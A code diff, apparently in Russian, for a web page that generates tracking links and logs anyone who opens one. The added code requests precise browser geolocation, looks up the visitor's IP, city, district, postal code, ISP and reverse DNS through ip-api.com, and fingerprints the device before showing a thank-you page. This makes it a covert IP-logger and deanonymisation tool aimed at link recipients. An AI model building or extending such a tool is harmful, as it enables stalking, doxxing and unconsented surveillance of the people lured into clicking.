@@ -346,12 +346,15 @@
                 logs: document.getElementById('logsSection')
             };
             
+            // Сначала скрываем все секции
             Object.values(sections).forEach(section => {
                 section.classList.remove('active');
             });
             
+            // Показываем выбранную секцию
             sections[type].classList.add('active');
             
+            // Если открываем логи, обновляем их отображение
             if (type === 'logs') {
                 updateTrackerLogDisplay();
             }
@@ -362,6 +365,7 @@
             const btn = document.getElementById('generateLinkBtn');
             const originalText = btn.innerHTML;
             
+            // Показать индикатор загрузки
             btn.innerHTML = '<i class="fas fa-cog fa-spin"></i> Генерация...';
             btn.disabled = true;
             
@@ -389,6 +393,7 @@
                 
                 showNotification('Ссылка успешно сгенерирована!', 'check-circle');
                 
+                // Восстановить кнопку
                 btn.innerHTML = originalText;
                 btn.disabled = false;
             }, 800);
@@ -404,6 +409,47 @@
             });
         }
 
+        // Получение данных о местоположении
+        async function getGeolocationData() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ error: "Geolocation не поддерживается" });
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    (error) => {
+                        resolve({ error: `Ошибка геолокации: ${error.message}` });
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            });
+        }
+
+        // Получение данных об устройстве
+        function getDeviceInfo() {
+            return {
+                platform: navigator.platform,
+                deviceMemory: navigator.deviceMemory || "Неизвестно",
+                hardwareConcurrency: navigator.hardwareConcurrency || "Неизвестно",
+                maxTouchPoints: navigator.maxTouchPoints || "Неизвестно",
+                battery: navigator.getBattery ? "Доступно" : "Недоступно",
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : "Недоступно"
+            };
+        }
+
         // Логирование посетителя
         async function logVisitor() {
             const urlParams = new URLSearchParams(window.location.search);
@@ -417,59 +463,78 @@
                 const language = navigator.language || navigator.userLanguage;
                 const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                 const referrer = document.referrer || 'Прямой переход';
+                const pageTitle = document.title;
+                const pageUrl = window.location.href;
+                const cookiesEnabled = navigator.cookieEnabled ? "Да" : "Нет";
+                const doNotTrack = navigator.doNotTrack || "Неизвестно";
+                const deviceInfo = getDeviceInfo();
+                const geolocation = await getGeolocationData();
 
                 // Получение данных через ip-api
                 let ipData = {};
                 try {
-                    const response = await fetch('https://ip-api.com/json/?fields=61439', {
-                        method: 'GET',
-                        headers: {
-                            'Accept': 'application/json'
-                        }
-                    });
-                    if (!response.ok) throw new Error('Ошибка ответа от ip-api');
+                    const response = await fetch('https://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query');
                     ipData = await response.json();
+                    
+                    if (ipData.status !== 'success') {
+                        console.error('Ошибка ip-api:', ipData.message);
+                        ipData = { error: ipData.message || 'Неизвестная ошибка' };
+                    }
                 } catch (error) {
                     console.error('Ошибка получения данных через ip-api:', error);
-                    ipData = { query: 'Неизвестно', country: 'Неизвестно', city: 'Неизвестно' };
+                    ipData = { error: 'Не удалось получить данные' };
                 }
 
                 const logEntry = {
                     trackerId,
                     timestamp,
                     ip: ipData.query || 'Неизвестно',
+                    continent: ipData.continent || 'Неизвестно',
+                    continentCode: ipData.continentCode || 'Н/Д',
                     country: ipData.country || 'Неизвестно',
+                    countryCode: ipData.countryCode || 'Н/Д',
                     region: ipData.regionName || 'Неизвестно',
+                    regionCode: ipData.region || 'Н/Д',
                     city: ipData.city || 'Неизвестно',
+                    district: ipData.district || 'Н/Д',
+                    zip: ipData.zip || 'Н/Д',
                     latitude: ipData.lat || 'Н/Д',
                     longitude: ipData.lon || 'Н/Д',
+                    timezone: ipData.timezone || 'Н/Д',
+                    offset: ipData.offset || 'Н/Д',
+                    currency: ipData.currency || 'Н/Д',
                     isp: ipData.isp || 'Неизвестно',
                     organization: ipData.org || 'Неизвестно',
+                    as: ipData.as || 'Н/Д',
+                    asname: ipData.asname || 'Н/Д',
+                    reverse: ipData.reverse || 'Н/Д',
                     isMobile: ipData.mobile ? 'Да' : 'Нет',
                     isProxy: ipData.proxy ? 'Да' : 'Нет',
                     isHosting: ipData.hosting ? 'Да' : 'Нет',
                     userAgent,
                     screenResolution,
+                    colorDepth: window.screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio || 1,
                     language,
                     timezone,
-                    referrer
+                    referrer,
+                    pageTitle,
+                    pageUrl,
+                    cookiesEnabled,
+                    doNotTrack,
+                    platform: deviceInfo.platform,
+                    deviceMemory: deviceInfo.deviceMemory,
+                    hardwareConcurrency: deviceInfo.hardwareConcurrency,
+                    maxTouchPoints: deviceInfo.maxTouchPoints,
+                    batteryStatus: deviceInfo.battery,
+                    connectionInfo: deviceInfo.connection,
+                    geolocation
                 };
 
-                // Ограничение на количество логов
-                if (trackerLogs.length >= 100) {
-                    trackerLogs.shift(); // Удаляем старую запись
-                }
-
                 trackerLogs.push(logEntry);
-                try {
-                    localStorage.setItem('trackerLogs', JSON.stringify(trackerLogs));
-                } catch (e) {
-                    console.error('Ошибка сохранения в localStorage:', e);
-                    showNotification('Ошибка сохранения логов', 'times-circle');
-                }
+                localStorage.setItem('trackerLogs', JSON.stringify(trackerLogs));
                 
-                updateTrackerLogDisplay();
-
+                // Показываем благодарность
                 document.body.innerHTML = `
                     <div class="container" style="text-align: center; padding: 50px;">
                         <h1 style="color: var(--primary-green);">
@@ -488,9 +553,14 @@
                 document.body.innerHTML = `
                     <div class="container" style="text-align: center; padding: 50px;">
                         <h1 style="color: var(--danger-red);">
-                            <i class="fas fa-exclamation-circle"></i> Ошибка!
+                            <i class="fas fa-exclamation-triangle"></i> Ошибка!
                         </h1>
                         <p>Произошла ошибка при записи данных.</p>
+                        <p style="margin-top: 30px;">
+                            <a href="#" onclick="window.history.back(); return false;" style="color: var(--primary-green); text-decoration: none;">
+                                <i class="fas fa-arrow-left"></i> Вернуться назад
+                            </a>
+                        </p>
                     </div>
                 `;
             }
@@ -510,25 +580,80 @@
             logs.forEach((log, index) => {
                 const div = document.createElement('div');
                 div.className = 'info-block';
+                
+                let connectionInfo = '';
+                if (typeof log.connectionInfo === 'object') {
+                    connectionInfo = `
+                        <p><strong>Тип соединения:</strong> ${escapeHtml(log.connectionInfo.effectiveType)}</p>
+                        <p><strong>Скорость (Mbps):</strong> ${escapeHtml(log.connectionInfo.downlink)}</p>
+                        <p><strong>Задержка (ms):</strong> ${escapeHtml(log.connectionInfo.rtt)}</p>
+                        <p><strong>Экономия трафика:</strong> ${escapeHtml(log.connectionInfo.saveData ? 'Да' : 'Нет')}</p>
+                    `;
+                } else {
+                    connectionInfo = `<p><strong>Информация о соединении:</strong> ${escapeHtml(log.connectionInfo)}</p>`;
+                }
+                
+                let geolocationInfo = '';
+                if (log.geolocation && !log.geolocation.error) {
+                    geolocationInfo = `
+                        <p><strong>Точность геолокации:</strong> ${escapeHtml(log.geolocation.accuracy)} метров</p>
+                    `;
+                } else if (log.geolocation) {
+                    geolocationInfo = `<p><strong>Геолокация:</strong> ${escapeHtml(log.geolocation.error)}</p>`;
+                }
+                
                 div.innerHTML = `
                     <p><strong>Запись #${index + 1}</strong></p>
                     <p><strong>ID трекера:</strong> ${escapeHtml(log.trackerId)}</p>
                     <p><strong>Время:</strong> ${escapeHtml(log.timestamp)}</p>
+                    
+                    <h3 style="color: var(--primary-green); margin: 15px 0 5px 0;">IP и местоположение</h3>
                     <p><strong>IP:</strong> ${escapeHtml(log.ip)}</p>
-                    <p><strong>Страна:</strong> ${escapeHtml(log.country)}</p>
-                    <p><strong>Регион:</strong> ${escapeHtml(log.region)}</p>
+                    <p><strong>Континент:</strong> ${escapeHtml(log.continent)} (${escapeHtml(log.continentCode)})</p>
+                    <p><strong>Страна:</strong> ${escapeHtml(log.country)} (${escapeHtml(log.countryCode)})</p>
+                    <p><strong>Регион:</strong> ${escapeHtml(log.region)} (${escapeHtml(log.regionCode)})</p>
                     <p><strong>Город:</strong> ${escapeHtml(log.city)}</p>
+                    <p><strong>Район:</strong> ${escapeHtml(log.district)}</p>
+                    <p><strong>Индекс:</strong> ${escapeHtml(log.zip)}</p>
                     <p><strong>Координаты:</strong> ${escapeHtml(log.latitude)}, ${escapeHtml(log.longitude)}</p>
+                    <p><strong>Часовой пояс:</strong> ${escapeHtml(log.timezone)} (смещение: ${escapeHtml(log.offset)} сек)</p>
+                    <p><strong>Валюта:</strong> ${escapeHtml(log.currency)}</p>
+                    ${geolocationInfo}
+                    
+                    <h3 style="color: var(--primary-green); margin: 15px 0 5px 0;">Сетевые данные</h3>
                     <p><strong>Провайдер:</strong> ${escapeHtml(log.isp)}</p>
                     <p><strong>Организация:</strong> ${escapeHtml(log.organization)}</p>
+                    <p><strong>AS номер:</strong> ${escapeHtml(log.as)}</p>
+                    <p><strong>AS имя:</strong> ${escapeHtml(log.asname)}</p>
+                    <p><strong>Обратный DNS:</strong> ${escapeHtml(log.reverse)}</p>
                     <p><strong>Мобильный:</strong> ${escapeHtml(log.isMobile)}</p>
                     <p><strong>Прокси/VPN:</strong> ${escapeHtml(log.isProxy)}</p>
                     <p><strong>Хостинг:</strong> ${escapeHtml(log.isHosting)}</p>
-                    <p><strong>Источник перехода:</strong> ${escapeHtml(log.referrer)}</p>
-                    <p><strong>Устройство:</strong> ${escapeHtml(log.userAgent)}</p>
+                    
+                    <h3 style="color: var(--primary-green); margin: 15px 0 5px 0;">Устройство и браузер</h3>
+                    <p><strong>User Agent:</strong> ${escapeHtml(log.userAgent)}</p>
+                    <p><strong>Платформа:</strong> ${escapeHtml(log.platform)}</p>
+                    <p><strong>Память устройства:</strong> ${escapeHtml(log.deviceMemory)} GB</p>
+                    <p><strong>Ядер CPU:</strong> ${escapeHtml(log.hardwareConcurrency)}</p>
+                    <p><strong>Макс. точек касания:</strong> ${escapeHtml(log.maxTouchPoints)}</p>
+                    <p><strong>Статус батареи:</strong> ${escapeHtml(log.batteryStatus)}</p>
+                    ${connectionInfo}
+                    
+                    <h3 style="color: var(--primary-green); margin: 15px 0 5px 0;">Экран и отображение</h3>
                     <p><strong>Разрешение экрана:</strong> ${escapeHtml(log.screenResolution)}</p>
+                    <p><strong>Глубина цвета:</strong> ${escapeHtml(log.colorDepth)} бит</p>
+                    <p><strong>Плотность пикселей:</strong> ${escapeHtml(log.pixelRatio)}</p>
+                    
+                    <h3 style="color: var(--primary-green); margin: 15px 0 5px 0;">Язык и время</h3>
                     <p><strong>Язык:</strong> ${escapeHtml(log.language)}</p>
                     <p><strong>Часовой пояс:</strong> ${escapeHtml(log.timezone)}</p>
+                    
+                    <h3 style="color: var(--primary-green); margin: 15px 0 5px 0;">Навигация</h3>
+                    <p><strong>Источник перехода:</strong> ${escapeHtml(log.referrer)}</p>
+                    <p><strong>Заголовок страницы:</strong> ${escapeHtml(log.pageTitle)}</p>
+                    <p><strong>URL страницы:</strong> ${escapeHtml(log.pageUrl)}</p>
+                    <p><strong>Cookies:</strong> ${escapeHtml(log.cookiesEnabled)}</p>
+                    <p><strong>Do Not Track:</strong> ${escapeHtml(log.doNotTrack)}</p>
                 `;
                 logOutput.appendChild(div);
             });
@@ -603,6 +728,7 @@
 
         // Инициализация
         document.addEventListener('DOMContentLoaded', () => {
+            // Привязка событий к кнопкам
             document.getElementById('createTrackerBtn').addEventListener('click', () => toggleSection('tracker'));
             document.getElementById('viewLogsBtn').addEventListener('click', () => toggleSection('logs'));
             document.getElementById('generateLinkBtn').addEventListener('click', generateTrackerLink);
@@ -610,10 +736,12 @@
             document.getElementById('exportLogsBtn').addEventListener('click', exportLogs);
             document.getElementById('logFilter').addEventListener('input', filterLogs);
 
+            // Проверка трекера в URL
             const urlParams = new URLSearchParams(window.location.search);
             if (urlParams.has('tracker')) {
                 logVisitor();
             } else {
+                // По умолчанию показываем секцию трекера
                 toggleSection('tracker');
             }
         });
